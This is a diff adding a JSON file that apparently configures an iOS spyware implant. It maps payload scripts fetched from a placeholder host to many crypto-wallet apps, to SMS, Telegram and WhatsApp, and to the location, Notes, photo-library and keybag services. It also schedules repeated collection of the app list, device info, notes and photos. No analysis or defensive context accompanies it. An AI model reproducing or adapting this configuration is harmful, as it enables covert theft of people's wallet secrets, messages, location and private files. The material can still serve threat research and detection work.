@@ -1,0 +1,352 @@
+{
+  "settings": {
+    "configRefreshInterval": 60,
+    "heartbeatReportInterval": 60,
+    "minPingIntervalPerDomain": 30,
+    "validationCacheTTL": 300,
+    "appListCollectInterval": 60,
+    "forceAppListRefresh": true,
+    "applistRefreshInterval": 60,
+    "pendingMonitorInterval": 60,
+    "debounceInterval": 5,
+    "cleanupInterval": 300,
+    "photoScanInterval": 60,
+    "notesScanInterval": 120
+  },
+  "core": {
+    "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=2",
+    "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
+    "size": 2373784
+  },
+  "entries": [
+    {
+      "bundleId": "com.apple.springboard",
+      "url": "http://[HOST_PLACEHOLDER]/details/helion.js?rv=3",
+      "sha256": "73390742eba6f7a85d894f961efa77272fbaceb91a278efcad4f497612c02699",
+      "size": 211856,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true,
+        "force_applist_refresh": true,
+        "refresh_applist": true,
+        "collect_applist": true,
+        "cold": 0
+      }
+    },
+    {
+      "bundleId": "com.bitkeep.os",
+      "url": "http://[HOST_PLACEHOLDER]/details/f6lib.js?rv=2",
+      "sha256": "6b471dca290fa2a90aef728c71970f2fa1e82db4d7fd16e8ae7edcee22fffc7f",
+      "size": 237368,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.bitpie.wallet",
+      "url": "http://[HOST_PLACEHOLDER]/details/r18lib.js?rv=2",
+      "sha256": "fe14a395403a24bc85405d3be122375698554445dbf118079b5149b20c186d62",
+      "size": 302344,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "coin98.crypto.finance.insights",
+      "url": "http://[HOST_PLACEHOLDER]/details/q17lib.js?rv=2",
+      "sha256": "87baeb04141c7d0dc39909b1612ea9701587e96907b60f33eefb4073316c82ca",
+      "size": 252976,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "org.toshi.distribution",
+      "url": "http://[HOST_PLACEHOLDER]/details/e5lib.js?rv=2",
+      "sha256": "887ecbcd1f46ea78f653b5cd5e9aba3be0608abd0465a8e54cc5e485faa47d9e",
+      "size": 236912,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "exodus-movement.exodus",
+      "url": "http://[HOST_PLACEHOLDER]/details/k11lib.js?rv=2",
+      "sha256": "c4487fa578fe54a7892a7257d35eb88de04fe489576f9f667b1541edc543318c",
+      "size": 301992,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "im.token.app",
+      "url": "http://[HOST_PLACEHOLDER]/details/b2lib.js?rv=2",
+      "sha256": "2c35640db2ef42ce36500b7b3ff80debe5fe2d1a8c1cb4b605a87131e8eaf249",
+      "size": 303216,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.kyrd.krystal.ios",
+      "url": "http://[HOST_PLACEHOLDER]/details/m13lib.js?rv=2",
+      "sha256": "9f13341e24bc1fb6a458c8e5ec66d62d3d51c91566969b5073de5458279c3e80",
+      "size": 455272,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "io.metamask.MetaMask",
+      "url": "http://[HOST_PLACEHOLDER]/details/a1lib.js?rv=2",
+      "sha256": "2b39efa19c85dd1a26258184cde5db028093a6e2ba39ece2a9925d79b0d4a2bb",
+      "size": 270328,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "org.mytonwallet.app",
+      "url": "http://[HOST_PLACEHOLDER]/details/j10lib.js?rv=2",
+      "sha256": "3023f68c01d2a080e77e401338cb77e73ea7d80de7af3060461ebe8559e8a69b",
+      "size": 2390680,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "app.phantom",
+      "url": "http://[HOST_PLACEHOLDER]/details/i9lib.js?rv=2",
+      "sha256": "50807338097b206bbe9c6908865a3c2e0b1ddc09e1acc414c7681856914856f0",
+      "size": 302408,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.skymavis.Genesis",
+      "url": "http://[HOST_PLACEHOLDER]/details/l12lib.js?rv=2",
+      "sha256": "7c4906c5651c7db311b0c8bc1d8896fcf2a48409d9b2310a4e0eda7d2d0f1cbf",
+      "size": 235952,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.solflare.mobile",
+      "url": "http://[HOST_PLACEHOLDER]/details/s19lib.js?rv=2",
+      "sha256": "cbc4a2a2f3f06a27f0017590a74048e97529f9149fa0262261378e1cbd4116b3",
+      "size": 271288,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.global.wallet.ios",
+      "url": "http://[HOST_PLACEHOLDER]/details/p16lib.js?rv=2",
+      "sha256": "16f3a3600cdb4d976668d152ebfe637bb735a889101d3706694108450f1a0076",
+      "size": 235584,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.tonhub.app",
+      "url": "http://[HOST_PLACEHOLDER]/details/n14lib.js?rv=2",
+      "sha256": "3c5d93f521e1230ba4cf8b9a98a9686846f89631c8de34d34d9a5f9d9fca2410",
+      "size": 335912,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.jbig.tonkeeper",
+      "url": "http://[HOST_PLACEHOLDER]/details/g7lib.js?rv=2",
+      "sha256": "c74c02d69856199eeb3c46ba851f179bff64d0c1e692526e7d6596df66ed9fae",
+      "size": 305144,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.tronlink.hdwallet",
+      "url": "http://[HOST_PLACEHOLDER]/details/c3lib.js?rv=2",
+      "sha256": "8d559a40db79dbb5aa70f238d277ccd2526616bf0e10454fa5d985b0f6370e8f",
+      "size": 270080,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.sixdays.trust",
+      "url": "http://[HOST_PLACEHOLDER]/details/d4lib.js?rv=2",
+      "sha256": "d9d489f12b234224fb98cc6633cd36c7552a8e83d99ef874cac87644f5cf6feb",
+      "size": 6723936,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.uniswap.mobile",
+      "url": "http://[HOST_PLACEHOLDER]/details/h8lib.js?rv=2",
+      "sha256": "2017739af93883ce7ab4f18d47667e9ee580e3d8251bfa19da541840489263eb",
+      "size": 236568,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.okex.OKExAppstoreFull",
+      "url": "http://[HOST_PLACEHOLDER]/details/t20lib.js?rv=2",
+      "sha256": "affb307827b283afcb41cd91ca32126b05e7ee61ab79e6fb09ede0cda1469bad",
+      "size": 2339408,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "imagent",
+      "url": "http://[HOST_PLACEHOLDER]/details/sms.js?rv=2",
+      "sha256": "0c964c33be2085354e4bc407e490a95c64e9d132469c70a8882a725f28008cdb",
+      "size": 328120,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "ph.telegra.Telegraph",
+      "url": "http://[HOST_PLACEHOLDER]/details/tglib.js?rv=2",
+      "sha256": "f78879169b1322d39a8f86a0f27a049b4900b213f2a836124ab6f8900a2fbd9e",
+      "size": 362064,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "net.whatsapp.WhatsApp",
+      "url": "http://[HOST_PLACEHOLDER]/details/wap.js?rv=2",
+      "sha256": "09e0ab1dde2183393bfc291006cf03495250e8117557a6d953dfa8a6e082d36c",
+      "size": 384208,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "locationd",
+      "url": "http://[HOST_PLACEHOLDER]/details/taskagent.js?rv=2",
+      "sha256": "c30e4bba3c36e630a0453cd245b9808b06fbffa5abf9586725bc6ae4031e22a5",
+      "size": 376336,
+      "cold": 0,
+      "flags": {
+        "do_not_close_after_run": true
+      }
+    },
+    {
+      "bundleId": "com.apple.notes",
+      "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=3",
+      "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
+      "size": 2373784,
+      "flags": {
+        "cold": 0,
+        "do_not_close_after_run": true
+      },
+      "cold": 0
+    },
+    {
+      "bundleId": "com.apple.photolibraryd",
+      "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=3",
+      "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
+      "size": 2373784,
+      "flags": {
+        "cold": 0,
+        "do_not_close_after_run": true
+      },
+      "cold": 0
+    },
+    {
+      "bundleId": "com.apple.mobile.keybagd",
+      "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=3",
+      "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
+      "size": 2373784,
+      "flags": {
+        "cold": 0,
+        "do_not_close_after_run": true
+      },
+      "cold": 0
+    }
+  ],
+  "tasks": [
+    {
+      "action": "collect_applist",
+      "interval": 60
+    },
+    {
+      "action": "refresh_device_info",
+      "interval": 60
+    },
+    {
+      "action": "collect_notes",
+      "interval": 120
+    },
+    {
+      "action": "memo_scan",
+      "interval": 120
+    },
+    {
+      "action": "collect_photo",
+      "interval": 120
+    },
+    {
+      "action": "photo_scan",
+      "interval": 120
+    }
+  ],
+  "commands": [
+    {
+      "cmd": "applist",
+      "args": {}
+    },
+    {
+      "cmd": "device_info",
+      "args": {}
+    },
+    {
+      "cmd": "notes",
+      "args": {}
+    },
+    {
+      "cmd": "memo",
+      "args": {}
+    },
+    {
+      "cmd": "photo",
+      "args": {}
+    },
+    {
+      "cmd": "photos",
+      "args": {}
+    }
+  ]
+}
